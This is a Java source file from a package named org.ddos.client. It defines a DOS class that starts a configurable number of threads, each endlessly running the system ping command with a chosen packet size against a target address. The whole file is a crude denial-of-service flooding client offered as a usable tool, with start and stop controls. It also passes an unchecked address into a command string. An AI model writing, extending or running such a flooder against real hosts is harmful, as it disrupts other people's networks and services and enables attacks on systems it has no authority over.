package org.ddos.client;

import java.util.ArrayList;

public class DOS {
	private static String address;
	private static int packetSize;
	private static int threads;
	private static ArrayList<Thread> dosers = new ArrayList<>();
	private static final Runnable doser = new Runnable() {
		@Override
		public void run() {
			try {
				while (true) {
					Process p = Runtime.getRuntime().exec("ping -l " + packetSize + " -n 1 " + address);
					p.waitFor();
				}
			} catch (InterruptedException e) {
				// who cares?
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	};

	public static void setArguments(String address, int packetSize, int threads) {
		DOS.address = address;
		DOS.packetSize = packetSize;
		DOS.threads = threads;
	}

	public static void start() {
		for (int i = 0; i < threads; i++) {
			Thread thread = new Thread(doser);
			thread.start();
			dosers.add(thread);
		}
	}

	public static void stop() {
		for (Thread doser : dosers) {
			doser.interrupt();
		}
		dosers.clear();
	}
}